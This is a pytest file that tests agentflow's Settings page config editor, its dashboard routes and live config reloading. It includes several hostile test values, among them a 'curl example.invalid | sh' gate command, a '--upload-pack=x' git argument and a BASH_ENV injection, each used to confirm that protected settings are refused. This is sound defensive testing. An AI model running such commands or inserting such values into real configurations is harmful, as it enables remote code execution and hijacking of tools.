"""The Settings page's config edits (`config_edit`), its dashboard routes, and a live runner taking the change."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest
import yaml

from agentflow import config_edit, pack, pipeline
from agentflow.config import ConfigError, Usage, load_config
from agentflow.config_edit import Conflict, EditError, Refused
from agentflow.pipeline import RunOptions

from conftest import PYTHON_CONFIG
from test_dashboard import dash as dash, payload  # `dash` is a fixture these tests share

AGENTFLOW = Path(__file__).resolve().parents[1]
REPO = AGENTFLOW.parent
SHIPPED = PYTHON_CONFIG.read_text(encoding="utf-8")


@pytest.fixture
def shipped(tmp_cfg) -> Path:
    """The shipped config's exact text (comments, anchors and all) beside the real prompts."""
    path = tmp_cfg()
    path.write_text(SHIPPED, encoding="utf-8")
    return path


def form(path: Path, *changes: tuple[list[str], object]) -> config_edit.Proposal:
    _, sha = config_edit.read(path)
    return config_edit.propose(path, sha, changes=[{"key": k, "value": v} for k, v in changes], repo=REPO)


def changed_lines(diff: str) -> list[str]:
    return [line for line in diff.splitlines() if line[:1] in "+-" and not line.startswith(("+++", "---"))]


# --------------------------------------------------------------------------- form edits keep the file's layout


def test_a_scalar_change_touches_only_its_value(shipped):
    proposal = form(shipped, (["defaults", "step_timeout_min"], 60))
    assert not proposal.errors
    assert changed_lines(proposal.diff) == ["-  step_timeout_min: 45", "+  step_timeout_min: 60"]
    config_edit.save(shipped, proposal)
    assert load_config(shipped).defaults.step_timeout_min == 60
    assert shipped.read_text(encoding="utf-8") == SHIPPED.replace("step_timeout_min: 45", "step_timeout_min: 60")


def test_a_flow_mapping_is_changed_key_by_key_and_keeps_its_comment(shipped):
    models = {"plan": "opus", "build": "opus", "review": "sonnet", "debug": "opus", "fast": "haiku"}  # drops mechanical
    proposal = form(shipped, (["agents", "claude", "models"], models))
    assert not proposal.errors, proposal.errors
    (removed, added) = changed_lines(proposal.diff)
    assert removed.startswith("-    models: {plan: opus, build: sonnet, mechanical: haiku,")
    assert added == "+    models: {plan: opus, build: opus, review: sonnet, debug: opus, fast: haiku}  # fallback when a phase sets no model"


def test_a_block_mapping_gains_and_loses_lines_in_place(shipped):
    labels = {"feature": "New module", "bug": "Bug", "eval": "Prompt or retrieval change", "design": "Design decision",
              "extra": "Extra"}
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    # `extra` is not a lane, so `validate` says so and nothing may be saved
    assert [i.path for i in proposal.errors] == ["dashboard.backlog.lane_labels.extra"]
    with pytest.raises(EditError):
        config_edit.save(shipped, proposal)
    del labels["extra"], labels["design"]
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    assert not proposal.errors
    assert changed_lines(proposal.diff) == ["-      bug: Bug fix", "+      bug: Bug", "-      design: Design decision"]
    kinds = {**yaml.safe_load(SHIPPED)["autonomy"]["resolve_kinds"], "blocked": 3}
    kinds["new_kind"] = 1
    lines = changed_lines(form(shipped, (["autonomy", "resolve_kinds"], kinds)).diff)
    assert lines == ["-    blocked: 2", "+    blocked: 3", "+    new_kind: 1"]


def test_a_missing_key_is_added_under_its_block(shipped):
    proposal = form(shipped, (["phases", "ship", "resolve"], True), (["phases", "verify", "model"], "opus"))
    assert not proposal.errors, proposal.errors
    lines = changed_lines(proposal.diff)
    assert "+    resolve: true" in lines and "-    model: sonnet" in lines and "+    model: opus" in lines
    config_edit.save(shipped, proposal)
    cfg = load_config(shipped)
    assert cfg.phases["ship"].resolve is True and cfg.phases["verify"].model == "opus"
    assert cfg.phases["ship"].steps[-1].type == "ci"  # the new line landed in `ship`, not in a step


def test_the_memory_section_saves_a_zero_and_keeps_the_comments(shipped):
    proposal = form(shipped, (["memory", "retro_every_days"], 0))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    text = shipped.read_text(encoding="utf-8")
    assert load_config(shipped).memory.retro_every_days == 0
    assert "retro_every_days: 0" in text
    assert all(line in text for line in SHIPPED.splitlines() if "#" in line)  # every comment survives


def test_the_graph_section_saves_into_the_pack(shipped):
    proposal = form(shipped, (["graph", "enabled"], True), (["graph", "exclude"], ["generated/", "*.snap"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    graph = load_config(shipped).graph
    assert graph.enabled is True and graph.exclude == ("generated/", "*.snap")


def test_the_form_switches_preflight_on(shipped):
    proposal = form(shipped, (["preflight", "enabled"], True))
    assert not proposal.errors, proposal.errors
    assert len(changed_lines(proposal.diff)) == 2  # one line out, one in
    config_edit.save(shipped, proposal)
    assert load_config(shipped).preflight.enabled is True


def test_the_form_sets_the_watchdog(shipped):
    proposal = form(shipped, (["watchdog", "no_progress_min"], 15))
    assert not proposal.errors, proposal.errors
    assert len(changed_lines(proposal.diff)) == 2  # one line out, one in
    config_edit.save(shipped, proposal)
    assert load_config(shipped).watchdog.no_progress_min == 15


def test_the_form_sets_the_usage_window(shipped):
    proposal = form(shipped, (["usage", "governor"], "observe"), (["usage", "five_hour_soft"], 0.6),
                    (["usage", "five_hour_hard"], 0.9), (["usage", "seven_day_soft"], 0.8),
                    (["usage", "finish_first"], False))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).usage == Usage("observe", 0.6, 0.9, 0.8, False)


def test_the_form_reports_a_soft_mark_above_the_hard_one(shipped):
    proposal = form(shipped, (["usage", "five_hour_soft"], 0.95))  # in range for the field, wrong across fields
    assert any(i.path == "usage.five_hour_soft" and i.level == "error" for i in proposal.issues)


def test_the_form_refuses_a_mark_out_of_its_range(shipped):
    for key, bad in (("five_hour_hard", 1.5), ("five_hour_soft", 0), ("seven_day_soft", -0.1)):
        with pytest.raises(EditError):
            form(shipped, (["usage", key], bad))
    with pytest.raises(EditError):
        form(shipped, (["usage", "governor"], "sometimes"))


def test_the_form_sets_the_ci_watch(shipped):
    proposal = form(shipped, (["ci", "watch_max_h"], 6))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).ci["watch_max_h"] == 6
    for bad in (-1, 721):
        with pytest.raises(EditError):
            form(shipped, (["ci", "watch_max_h"], bad))


def test_the_form_sets_the_early_pr_phase(shipped):
    proposal = form(shipped, (["ci", "early_pr_after"], "verify"))
    assert not proposal.errors, proposal.errors
    assert changed_lines(proposal.diff) == ["+  early_pr_after: verify"]
    config_edit.save(shipped, proposal)
    assert load_config(shipped).ci["early_pr_after"] == "verify"
    proposal = form(shipped, (["ci", "early_pr_after"], ""))
    assert not proposal.errors, proposal.errors  # empty: the draft PR opens at `finish`, as it always has
    proposal = form(shipped, (["ci", "early_pr_after"], "nope"))
    assert [i.path for i in proposal.errors] == ["ci.early_pr_after"]
    with pytest.raises(EditError):
        config_edit.save(shipped, proposal)
    with pytest.raises(EditError):
        form(shipped, (["ci", "early_pr_after"], "two\nlines"))


def test_the_form_sets_the_board_refresh(shipped):
    proposal = form(shipped, (["dashboard", "board_refresh_s"], 5))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).dashboard["board_refresh_s"] == 5
    for bad in (0.1, 120):
        with pytest.raises(EditError):
            form(shipped, (["dashboard", "board_refresh_s"], bad))


def test_the_form_sets_the_artifact_cap(shipped):
    config_edit.save(shipped, form(shipped, (["dashboard", "artifact_max_kb"], 1024)))
    assert load_config(shipped).dashboard["artifact_max_kb"] == 1024
    for bad in (8, 10000):
        with pytest.raises(EditError):
            form(shipped, (["dashboard", "artifact_max_kb"], bad))


def test_an_optional_text_field_set_to_null_removes_the_key(shipped):
    proposal = form(shipped, (["phases", "verify", "model"], None))
    assert changed_lines(proposal.diff) == ["-    model: sonnet"]


def test_values_that_need_quoting_are_quoted(shipped):
    labels = {"feature": "New: module, #1", "bug": "Bug fix", "eval": "x", "design": "y"}
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    config_edit.save(shipped, proposal)
    assert yaml.safe_load(shipped.read_text(encoding="utf-8"))["dashboard"]["backlog"]["lane_labels"] == labels


# --------------------------------------------------------------------------- what the form refuses


@pytest.mark.parametrize("key, value, error", [
    (["gates", "floor", "run"], "true", Refused),                     # not a form field at all
    (["agents", "claude", "command"], ["sh"], Refused),
    (["defaults", "step_timeout_min"], "60", EditError),               # the field's kind
    (["defaults", "step_timeout_min"], 0, EditError),                  # its bounds
    (["defaults", "push"], False, Refused),                          # removed: `finish` always pushes
    (["context", "rollover_pct"], True, EditError),
    (["context", "max_compactions"], 0, EditError),                    # at least one
    (["context", "context_window_tokens"], 50000, EditError),          # below Claude Code's smallest auto-compact window
    (["memory", "lessons_max_tokens"], 5000, EditError),               # above the range
    (["graph", "max_file_kb"], 0, EditError),
    (["effort", "allowed"], ["low", "turbo"], EditError),
    (["effort", "sizing"], "yes", EditError),
    (["defaults", "agent"], "nobody", EditError),
    (["autonomy", "resolve_kinds"], {"blocked": 0}, EditError),
    (["dashboard", "backlog", "lane_labels"], {"bug": "two\nlines"}, EditError),
])
def test_the_form_accepts_only_its_fields_with_their_kinds(shipped, key, value, error):
    with pytest.raises(error):
        form(shipped, (key, value))


def test_a_stale_base_is_a_conflict(shipped):
    proposal = form(shipped, (["defaults", "fix_attempts"], 4))
    shipped.write_text(SHIPPED.replace("max_turns: 80", "max_turns: 81"), encoding="utf-8")
    with pytest.raises(Conflict):
        config_edit.save(shipped, proposal)
    with pytest.raises(Conflict):
        config_edit.propose(shipped, proposal.base_sha256, changes=[{"key": ["defaults", "fix_attempts"], "value": 4}])


def test_an_anchored_value_used_elsewhere_is_not_edited_through_the_text():
    text = "a: &x {k: 1}\nb: *x\nc: {k: 1}\n"
    with pytest.raises(EditError, match="anchored"):
        config_edit._edit(text, ("a", "k"), 2)
    assert config_edit._edit(text, ("c", "k"), 2) == "a: &x {k: 1}\nb: *x\nc: {k: 2}\n"


def test_a_symlinked_config_is_refused(shipped, tmp_path):
    link = tmp_path / ".agentflow" / "linked.yaml"
    link.symlink_to(shipped)
    with pytest.raises(EditError, match="symlink"):
        config_edit.read(link)


# --------------------------------------------------------------------------- the YAML tab


def test_yaml_text_may_change_anything_but_the_protected_settings(shipped):
    _, sha = config_edit.read(shipped)
    edited = SHIPPED.replace("lanes: [feature, bug, eval, design]   #", "lanes: [feature, bug, eval, design]  # edited:")
    proposal = config_edit.propose(shipped, sha, text=edited, repo=REPO)
    assert proposal.changed and not proposal.errors
    for old, new in [
        ('floor:        {run: "true"}', 'floor:        {run: "false"}'),
        ('floor:        {run: "true"}', 'floor:        {run: "true", agent_check: true}'),  # a gate the agent runs
        ("    - CONSTRAINTS.md\n", ""),                                                  # guardrails
        ("    command: [claude]", "    command: [sh, -c, claude]"),                     # an agent's command line
        ('    POSTGRES_HOST_PORT: "55432"', '    POSTGRES_HOST_PORT: "55432"\n    BASH_ENV: /tmp/x'),  # defaults.env
        ("  plan_is_small:          {check: plan_tasks, file: \"{plan}\", max: 3}",
         "  plan_is_small:          {check: plan_tasks, file: \"{plan}\", max: 30}"),   # conditions
        ("    skip_if: build_done\n", ""),                                               # a phase's workflow
        ("  refine_prompt: refine.md", "  refine_prompt: ../../../CONSTRAINTS.md"),       # a file read into prompts
        ("  fork_from: main", "  fork_from: --upload-pack=x"),                          # reaches git
        ('  progress_file: "runs/{run}/progress.md"', '  progress_file: "../../x.md"'),  # a path the runner writes
        ("version: 2\n", "version: 3\n"),                                          # the pack's format
        ('engine: ">=3,<4"', 'engine: ">=3"'),                                      # the engines it runs on
    ]:
        assert old in SHIPPED, old
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


@pytest.mark.parametrize("old, new", [
    ("  commit_trailer:", "  skills_dir: skills\n  commit_trailer:"),                  # project.skills_dir added
    ('    spec_file: "SPEC-{module}.md"', '    spec_file: "{module}-spec.md"'),             # changed
    ('    spec_file: "SPEC-{module}.md"   # a module\'s spec is <specs>/<spec_file>\n', ""),  # removed
    ("    plans: docs/plans\n", '    plans: docs/plans\n    done_status: "^Status: finished"\n'),  # project.docs.done_status
    ("version: 2\n", "version: 2\npaths:\n  state_dir: ../elsewhere\n"),              # paths.state_dir
    ("  path: docs/specs/CAPABILITY-MAP.md", "  path: docs/other.md"),                  # work_source
    ("    ship: finishing-a-development-branch", "    ship: executing-plans"),           # skills.map
])
def test_yaml_text_may_not_change_the_paths_the_runner_reads(shipped, old, new):
    _, sha = config_edit.read(shipped)
    assert old in SHIPPED, old
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


def test_the_settings_page_refuses_constraint_override(shipped):
    """Who may lift a constraint gate is a guardrail: neither the YAML tab nor the form may add, change or drop it."""
    _, sha = config_edit.read(shipped)
    line = '  reject_trailers: ["Constraints-Approved-By"]\n'
    assert line in SHIPPED
    added = SHIPPED.replace(line, line + '  constraint_override: {trailer: Constraints-Approved-By, gates: [floor]}\n')
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=added, repo=REPO)
    with pytest.raises(EditError):
        form(shipped, (["guardrails", "constraint_override"], {"trailer": "Constraints-Approved-By", "gates": ["floor"]}))
    with pytest.raises(EditError):
        form(shipped, (["guardrails", "constraint_override", "gates"], ["floor"]))
    assert config_edit.read(shipped)[1] == sha


def test_the_form_refuses_switching_refinement_off(shipped):
    with pytest.raises(EditError):
        form(shipped, (["autonomy", "finding_rounds"], 0))
    assert not form(shipped, (["autonomy", "finding_rounds"], 1)).errors
    _, sha = config_edit.read(shipped)
    proposal = config_edit.propose(shipped, sha, text=SHIPPED.replace("finding_rounds: 2", "finding_rounds: 0"), repo=REPO)
    assert "autonomy.finding_rounds" in [i.path for i in proposal.errors]
    listed = SHIPPED.replace("non_blocking_severities: [minor, low, info, nit]",
                             "non_blocking_severities: [minor, high]")
    assert listed != SHIPPED
    proposal = config_edit.propose(shipped, sha, text=listed, repo=REPO)
    assert "autonomy.non_blocking_severities" in [i.path for i in proposal.errors]


def test_gate_groups_are_protected(shipped):
    _, sha = config_edit.read(shipped)
    old = 'floor:        {run: "true"}'
    assert old in SHIPPED
    for extra in ("group: api", "resource: db"):
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, f'floor:        {{run: "true", {extra}}}', 1),
                                repo=REPO)


def test_reconciles_blocks_on_findings_and_the_doubt_skill_are_protected(shipped):
    _, sha = config_edit.read(shipped)
    for old, new in [
        ("      - {id: plan, lanes: [feature], skill: writing-plans,",
         "      - {id: plan, reconciles: true, lanes: [feature], skill: writing-plans,"),     # a step reconciles
        ("blocks_on_findings: true, gates_first: true,", "blocks_on_findings: false, gates_first: true,"),  # flipped
        ("  map:                          #", "  map:\n    doubt: agentflow-review\n    #"),  # skills.map.doubt added
    ]:
        assert old in SHIPPED, old
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


def test_dependency_review_is_protected(shipped):
    assert "vuln.dependency_review" in config_edit.PROTECTED
    assert "vuln.dependency_review" in config_edit.form_fields(shipped)["protected"]
    with pytest.raises(Refused):  # the form has no field for it
        form(shipped, (["vuln", "dependency_review"], True))
    _, sha = config_edit.read(shipped)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED + "vuln: {dependency_review: true}\n", repo=REPO)


def test_retro_step_is_protected(shipped):
    assert "retro_step" in config_edit.PROTECTED
    with pytest.raises(Refused):  # the form has no field for it
        form(shipped, (["retro_step", "prompt"], "other.md"))
    _, sha = config_edit.read(shipped)
    for added in ("retro_step: {id: retro, skill: agentflow-retro, role: review, prompt: refine.md}\n",
                  "retro_step: null\n"):  # what the retro session reads, or no retro at all
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED + added, repo=REPO)


def test_the_approval_ramp_is_protected(shipped):
    assert "autonomy.approvals" in config_edit.PROTECTED and "autonomy.ramp_samples" in config_edit.PROTECTED
    for key, value in ((["autonomy", "approvals"], {"define": "auto"}), (["autonomy", "ramp_samples"], 3)):
        with pytest.raises(Refused):  # the form has no field for it
            form(shipped, (key, value))
    _, sha = config_edit.read(shipped)
    for key, value in (("approvals", {"define": "observe"}), ("ramp_samples", 7)):
        data = yaml.safe_load(SHIPPED)
        data.setdefault("autonomy", {})[key] = value  # a page cannot move the ramp's promotion bar
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=yaml.safe_dump(data, sort_keys=False), repo=REPO)


def test_speculate_is_a_form_field(shipped):
    assert _fields(shipped)[("autonomy", "speculate")]["kind"] == "list"
    proposal = form(shipped, (["autonomy", "speculate"], ["plan"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).autonomy["speculate"] == ["plan"]
    assert _fields(shipped)[("autonomy", "speculate")]["value"] == ["plan"]
    assert "autonomy.speculate" in [i.path for i in form(shipped, (["autonomy", "speculate"], ["define"])).errors]


def test_policy_is_protected(shipped):
    assert "policy" in config_edit.PROTECTED
    for key in (["policy", "enforce"], ["policy", "obligations", "reviewed"]):
        with pytest.raises(Refused):  # the form has no field for it
            form(shipped, (key, "block"))
    _, sha = config_edit.read(shipped)
    for added in ("policy: {enforce: block}\n", "policy: {obligations: {reviewed: null}}\n"):  # a page cannot relax or tighten the bar
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED + added, repo=REPO)


def test_workspace_is_protected(shipped):
    assert "workspace" in config_edit.PROTECTED
    assert "workspace" in config_edit.form_fields(shipped)["protected"]
    _, sha = config_edit.read(shipped)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED + 'workspace: {roots: ["/x"]}\n', repo=REPO)


def test_the_pack_form_cannot_set_the_cap(shipped):
    _, sha = config_edit.read(shipped)
    with pytest.raises(Refused):  # the form has no such field
        config_edit.propose(shipped, sha, changes=[{"key": ["workspace", "max_active_runs"], "value": 2}], repo=REPO)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED + "workspace: {max_active_runs: 2}\n", repo=REPO)


def test_a_dashboard_field_the_user_file_sets_is_read_only(shipped):
    from agentflow import layers

    target = layers.user_config_path()
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(yaml.safe_dump({"dashboard": {"done_shown": 20}}), encoding="utf-8")
    fields = {tuple(f["key"]): f for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert "user config" in fields[("dashboard", "done_shown")]["readonly"]


def test_the_inherited_environment_settings_are_protected(shipped):
    _, sha = config_edit.read(shipped)
    old = '    POSTGRES_HOST_PORT: "55432"\n'
    assert old in SHIPPED
    for added in ('  env_inherit: {drop: ["*_URL"]}\n', "  env_inherit: {drop_dotenv: []}\n"):  # a run's agents see the leak again
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, old + added, 1), repo=REPO)
    for key, value in ((["defaults", "env_inherit", "drop"], ["X"]), (["defaults", "env_inherit", "drop_dotenv"], [])):
        with pytest.raises(Refused):  # the form has no field for it
            form(shipped, (key, value))
    assert "defaults.env_inherit" in config_edit.PROTECTED


def test_yaml_text_may_not_switch_the_work_source_to_specs(shipped):
    _, sha = config_edit.read(shipped)
    lines = SHIPPED.splitlines(keepends=True)
    old = "".join(line for line in lines if line.startswith(("  kind: capability_map", "  path: docs/specs/CAPABILITY")))
    assert old in SHIPPED
    text = SHIPPED.replace(old, "  kind: specs\n", 1)
    assert yaml.safe_load(text)["work_source"] == {"kind": "specs"}
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)


def test_yaml_text_may_not_switch_the_work_source_to_backlog(shipped):
    _, sha = config_edit.read(shipped)
    lines = SHIPPED.splitlines(keepends=True)
    old = "".join(line for line in lines if line.startswith(("  kind: capability_map", "  path: docs/specs/CAPABILITY")))
    assert old in SHIPPED
    text = SHIPPED.replace(old, "  kind: backlog\n", 1)
    assert yaml.safe_load(text)["work_source"] == {"kind": "backlog"}
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)
    with pytest.raises(Refused):  # nor does the form have a field for it
        form(shipped, (["work_source", "kind"], "backlog"))


def test_worktrees_dir_is_still_refused_by_the_page(shipped):
    _, sha = config_edit.read(shipped)
    with pytest.raises(Refused):
        form(shipped, (["project", "worktrees_dir"], "wt"))
    text = SHIPPED.replace("  branch:", "  worktrees_dir: wt\n  branch:", 1)
    assert "worktrees_dir: wt" in text
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)


@pytest.mark.parametrize("key, value", [
    (["project", "skills_dir"], "skills"),
    (["project", "docs", "spec_file"], "{module}-spec.md"),
    (["project", "docs", "done_status"], "^Status: finished"),
    (["paths", "state_dir"], "../elsewhere"),
    (["work_source", "path"], "docs/other.md"),
    (["skills", "map", "ship"], "executing-plans"),
])
def test_the_form_refuses_the_paths_the_runner_reads(shipped, key, value):
    with pytest.raises(Refused):
        form(shipped, (key, value))


@pytest.mark.parametrize("key", ["review", "debug", "review_feedback", "patch"])
def test_new_skills_map_keys_are_refused_by_the_page(shipped, key):
    with pytest.raises(Refused):
        form(shipped, (["skills", "map", key], "agentflow-review"))
    _, sha = config_edit.read(shipped)
    line = f"    {key}: "  # the shipped config may already map the key: change its value, else add the key
    text = (SHIPPED.replace(line + "receiving-code-review", line + "agentflow-review", 1) if line + "receiving-code-review" in SHIPPED
            else SHIPPED.replace("    ship: finishing-a-development-branch",
                                 f"{line}agentflow-review\n    ship: finishing-a-development-branch", 1))
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)


def test_yaml_text_that_does_not_load_or_validate_reports_why(shipped):
    _, sha = config_edit.read(shipped)
    broken = config_edit.propose(shipped, sha, text="version: [", repo=REPO)
    assert broken.errors and "not valid YAML" in broken.errors[0].message
    invalid = config_edit.propose(shipped, sha, text=SHIPPED.replace("  default: medium ", "  default: turbo  "), repo=REPO)
    assert [i.path for i in invalid.errors] == ["effort.default"]


def test_save_replaces_the_file_and_keeps_its_mode(shipped):
    os.chmod(shipped, 0o640)
    proposal = form(shipped, (["ci", "poll_s"], 30))
    digest = config_edit.save(shipped, proposal)
    assert config_edit.read(shipped)[1] == digest
    assert shipped.stat().st_mode & 0o777 == 0o640
    assert not [p for p in shipped.parent.iterdir() if p.name.startswith(".config")]  # no temp files left


def test_form_fields_carry_values_and_the_lines_comments(shipped):
    data = config_edit.form_fields(shipped)
    fields = {tuple(f["key"]): f for s in data["sections"] for f in s["fields"]}
    assert fields[("defaults", "fix_attempts")]["value"] == 3
    assert fields[("defaults", "fix_attempts")]["help"].startswith("gate failure")
    assert fields[("defaults", "agent")]["options"] == ["claude", "codex"]
    assert fields[("phases", "build", "model")]["kind"] == "map"
    assert ("gates", "floor", "run") not in fields and data["text"] == SHIPPED


# --------------------------------------------------------------------------- the dashboard routes


def test_settings_routes_need_the_token(dash):
    assert dash.get("/api/config", token=None)[0] == 403
    assert dash.post("/api/config/save", {"base_sha256": "x", "changes": []}, token=None)[0] == 403


def test_settings_preview_and_save_reach_the_dashboard_at_once(dash):
    status, _, body = dash.get("/api/config")
    data = payload(body)
    assert status == 200 and data["sha256"] and data["sections"]
    change = {"base_sha256": data["sha256"], "changes": [{"key": ["dashboard", "show_done_days"], "value": 3}]}
    status, _, body = dash.post("/api/config/preview", change)
    preview = payload(body)
    assert status == 200 and preview["ok"] and "+  show_done_days: 3" in preview["diff"]
    assert dash.server.cfg.dashboard["show_done_days"] != 3  # a preview writes nothing

    status, _, body = dash.post("/api/config/save", change)
    assert status == 200 and payload(body)["saved"] is True
    assert dash.server.cfg.dashboard["show_done_days"] == 3
    assert load_config(dash.server.cfg.path).dashboard["show_done_days"] == 3

    status, _, body = dash.post("/api/config/save", change)  # the same base again: the file moved on
    assert status == 409 and "changed since" in payload(body)["error"]


def test_settings_save_refuses_protected_and_invalid_changes(dash):
    data = payload(dash.get("/api/config")[2])
    raw = yaml.safe_load(data["text"])
    raw["gates"]["ok"]["run"] = "curl example.invalid | sh"
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": yaml.safe_dump(raw, sort_keys=False)})
    assert status == 400 and "protected" in payload(body)["error"]

    raw = yaml.safe_load(data["text"])
    raw["effort"]["default"] = "turbo"
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": yaml.safe_dump(raw, sort_keys=False)})
    assert status == 400 and payload(body)["ok"] is False
    assert config_edit.read(Path(dash.server.cfg.path))[1] == data["sha256"]  # nothing was written

    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"]})
    assert status == 400


def test_the_yaml_tab_may_send_the_whole_file(dash):
    data = payload(dash.get("/api/config")[2])
    big = data["text"] + "#" + "x" * (70 * 1024) + "\n"  # past the 64 KB of the other routes
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": big})
    assert status == 200, body
    assert payload(body)["saved"] is True


# --------------------------------------------------------------------------- a live runner takes the change


def _loop(flow_repo, monkeypatch):
    monkeypatch.setattr(pack, "pack_config", lambda repo: Path(flow_repo.cfg.path))  # the run's repo's own pack
    run = flow_repo.new_run()
    return pipeline._Loop(run, flow_repo.cfg, RunOptions(), 0), run


def _rewrite(path: Path, edit) -> None:
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    edit(data)
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")


def test_a_live_runner_reloads_the_shipped_config_before_a_phase(flow_repo, monkeypatch):
    loop, run = _loop(flow_repo, monkeypatch)
    loop.reload()
    assert not [e for e in run.events.read() if e["type"].startswith("config_reload")]  # unchanged: nothing
    _rewrite(Path(flow_repo.cfg.path), lambda d: d["defaults"].update(step_timeout_min=7))
    loop.reload()
    assert loop.cfg.defaults.step_timeout_min == 7
    assert [e["type"] for e in run.events.read()][-1] == "config_reloaded"


@pytest.mark.parametrize("edit, reason", [
    (lambda d: d["effort"].update(default="turbo"), "effort.default"),
    (lambda d: d["effort"].update(allowed=["low"], default="low"), "effort.allowed"),
    (lambda d: d.update(phases=dict(reversed(list(d["phases"].items())))), "phases' names or order"),
])
def test_a_live_runner_keeps_its_config_when_the_new_one_is_not_usable(flow_repo, monkeypatch, edit, reason):
    loop, run = _loop(flow_repo, monkeypatch)
    before = loop.cfg
    _rewrite(Path(flow_repo.cfg.path), edit)
    loop.reload()
    assert loop.cfg is before
    last = run.events.read()[-1]
    assert last["type"] == "config_reload_skipped" and reason in last["reason"]
    loop.reload()  # the same broken file is reported once
    assert run.events.read()[-1]["seq"] == last["seq"]


def test_a_runner_on_another_config_never_reloads_it(flow_repo, monkeypatch):
    monkeypatch.setattr(pack, "pack_config", lambda repo: PYTHON_CONFIG)
    run = flow_repo.new_run()
    loop = pipeline._Loop(run, flow_repo.cfg, RunOptions(), 0)
    _rewrite(Path(flow_repo.cfg.path), lambda d: d["defaults"].update(step_timeout_min=7))
    loop.reload()
    assert loop.cfg is flow_repo.cfg
    assert json.dumps([e["type"] for e in run.events.read()]).count("config_reload") == 0


# --------------------------------------------------------------------------- a sparse pack: the form reads the layers


def _sparse(sparse_repo: Path) -> Path:
    return pack.pack_config(sparse_repo)


def _fields(path: Path) -> dict:
    return {tuple(f["key"]): f for s in config_edit.form_fields(path)["sections"] for f in s["fields"]}


def _user_file(data: dict) -> Path:
    from agentflow import layers

    target = layers.user_config_path()
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(yaml.safe_dump(data), encoding="utf-8")
    return target


def _sparse_form(path: Path, *changes) -> config_edit.Proposal:
    _, sha = config_edit.read(path)
    return config_edit.propose(path, sha, changes=[{"key": k, "value": v} for k, v in changes], repo=path.parents[1])


def test_effort_sizing_round_trips(sparse_repo):
    path = _sparse(sparse_repo)
    assert _fields(path)[("effort", "sizing")]["source"] == "engine"
    proposal = _sparse_form(path, (["effort", "sizing"], False))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path).effort.sizing is False


def test_form_shows_the_effective_value_its_layer_and_its_help(sparse_repo):
    path = _sparse(sparse_repo)
    fields = _fields(path)
    timeout = fields[("defaults", "step_timeout_min")]
    assert (timeout["value"], timeout["source"], timeout["present"]) == (45, "engine", False)
    assert fields[("defaults", "task_budget_usd")]["help"] == "the soft budget grows to fit the plan"  # the engine's comment
    hard = fields[("defaults", "run_budget_hard_usd")]
    assert (hard["value"], hard["source"], hard["present"]) == (65, "engine", False)
    assert hard["help"].startswith("hard: the run stops")
    models = fields[("agents", "claude", "models")]
    assert models["source"] == "engine" and models["value"]["plan"] == "sonnet" and not models.get("readonly")
    assert fields[("phases", "build", "resolve")]["value"] is True
    assert fields[("phases", "build", "resolve")]["source"] == "engine"
    assert ("hitl", "remind_after_h") in fields                          # a section the pack never wrote
    assert fields[("hitl", "remind_after_h")]["present"] is False
    path.write_text(path.read_text(encoding="utf-8") + "defaults:\n  fix_attempts: 5  # mine\n", encoding="utf-8")
    fields = _fields(path)
    mine = fields[("defaults", "fix_attempts")]
    assert (mine["value"], mine["source"], mine["present"], mine["help"]) == (5, "project", True, "mine")


def test_form_saves_a_phase_knob_into_a_sparse_pack(sparse_repo):
    path = _sparse(sparse_repo)
    before = load_config(path)
    proposal = _sparse_form(path, (["phases", "plan", "needs_approval"], False))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["phases"] == {"plan": {"needs_approval": False}}
    after = load_config(path)
    assert after.phases["plan"].needs_approval is False
    assert list(after.phases) == list(before.phases)
    assert {n: p.steps for n, p in after.phases.items()} == {n: p.steps for n, p in before.phases.items()}


